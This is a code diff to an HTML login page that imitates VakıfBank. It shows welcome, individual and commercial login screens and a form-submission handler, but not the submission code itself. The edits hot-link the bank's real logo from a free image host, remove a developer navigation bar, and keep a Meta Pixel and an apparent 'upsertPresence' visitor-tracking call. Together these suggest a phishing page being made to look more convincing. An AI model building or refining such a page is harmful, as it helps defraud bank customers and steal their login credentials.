@@ -115,16 +115,9 @@ upsertPresence('giris', null, false);
       gap: 8px;
     }
     .logo-v {
-      width: 32px;
       height: 32px;
-      background: linear-gradient(135deg, var(--gold-bright), var(--gold));
-      border-radius: 8px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-weight: 800;
-      font-size: .9rem;
-      color: #3d2518;
+      width: auto;
+      display: block;
     }
     .logo-name { font-size: 1.1rem; font-weight: 700; }
     .help-btn {
@@ -193,10 +186,8 @@ upsertPresence('giris', null, false);
       box-shadow: 0 8px 32px rgba(0,0,0,.3);
     }
     .welcome-logo-big .logo-v {
-      width: 56px;
       height: 56px;
-      font-size: 1.5rem;
-      border-radius: 14px;
+      width: auto;
     }
     .welcome-title {
       font-size: 1.75rem;
@@ -402,30 +393,6 @@ upsertPresence('giris', null, false);
     .form-error.show { display: block; }
 
     .hidden { display: none !important; }
-
-    .dev-nav {
-      position: fixed;
-      bottom: 12px;
-      left: 50%;
-      transform: translateX(-50%);
-      display: flex;
-      gap: 6px;
-      z-index: 999;
-      background: rgba(0,0,0,.85);
-      padding: 8px 12px;
-      border-radius: 20px;
-    }
-    .dev-nav button {
-      border: none;
-      background: #333;
-      color: #fff;
-      padding: 6px 12px;
-      border-radius: 12px;
-      font-size: .7rem;
-      cursor: pointer;
-      font-family: inherit;
-    }
-    .dev-nav button.active { background: var(--gold); color: #222; }
   </style>
   <!-- Meta Pixel Code -->
   <script>
@@ -456,7 +423,7 @@ upsertPresence('giris', null, false);
       <header class="welcome-header">
         <button type="button" class="lang-select">TR <svg viewBox="0 0 24 24" fill="currentColor"><path d="M7 10l5 5 5-5z"/></svg></button>
         <div class="logo-row">
-          <span class="logo-v">V</span>
+          <img class="logo-v" src="https://i.ibb.co/Zpq3TBjz/Vakif-Bank-Logo.webp" alt="VakıfBank" />
           <span class="logo-name">VakıfBank</span>
         </div>
         <button type="button" class="help-btn" aria-label="Yardım"></button>
@@ -470,7 +437,7 @@ upsertPresence('giris', null, false);
       </div>
 
       <div class="welcome-center">
-        <div class="welcome-logo-big"><span class="logo-v">V</span></div>
+        <div class="welcome-logo-big"><img class="logo-v" src="https://i.ibb.co/Zpq3TBjz/Vakif-Bank-Logo.webp" alt="VakıfBank" /></div>
         <h1 class="welcome-title">Hoş Geldiniz</h1>
         <p class="welcome-sub">Burası Sizin Yeriniz</p>
         <div class="type-btns">
@@ -512,7 +479,7 @@ upsertPresence('giris', null, false);
       <header class="login-header">
         <button type="button" class="back-btn" data-back aria-label="Geri">‹</button>
         <div class="logo-row">
-          <span class="logo-v">V</span>
+          <img class="logo-v" src="https://i.ibb.co/Zpq3TBjz/Vakif-Bank-Logo.webp" alt="VakıfBank" />
           <span class="logo-name">VakıfBank</span>
         </div>
       </header>
@@ -543,7 +510,7 @@ upsertPresence('giris', null, false);
       <header class="login-header">
         <button type="button" class="back-btn" data-back aria-label="Geri">‹</button>
         <div class="logo-row">
-          <span class="logo-v">V</span>
+          <img class="logo-v" src="https://i.ibb.co/Zpq3TBjz/Vakif-Bank-Logo.webp" alt="VakıfBank" />
           <span class="logo-name">VakıfBank</span>
         </div>
       </header>
@@ -571,13 +538,6 @@ upsertPresence('giris', null, false);
     </section>
   </div>
 
-  <!-- Hızlı ekran geçişi (geliştirme) -->
-  <nav class="dev-nav" aria-label="Ekran seç">
-    <button type="button" data-screen="welcome" class="active">1 Karşılama</button>
-    <button type="button" data-screen="bireysel">2 Bireysel</button>
-    <button type="button" data-screen="ticari">3 Ticari</button>
-  </nav>
-
   <script>
     const screens = {
       welcome: document.getElementById("screen-welcome"),
@@ -588,9 +548,6 @@ upsertPresence('giris', null, false);
     function show(name) {
       Object.values(screens).forEach((s) => s.classList.remove("active"));
       screens[name].classList.add("active");
-      document.querySelectorAll(".dev-nav button").forEach((b) => {
-        b.classList.toggle("active", b.dataset.screen === name);
-      });
       // Clear errors on screen switch
       document.querySelectorAll(".form-error").forEach((e) => {
         e.classList.remove("show");
@@ -608,10 +565,6 @@ upsertPresence('giris', null, false);
 
     document.querySelectorAll(".login-tab").forEach((tab) => {
       tab.addEventListener("click", () => show(tab.dataset.tab));
-    });
-
-    document.querySelectorAll(".dev-nav button").forEach((btn) => {
-      btn.addEventListener("click", () => show(btn.dataset.screen));
     });
 
     // Form submission
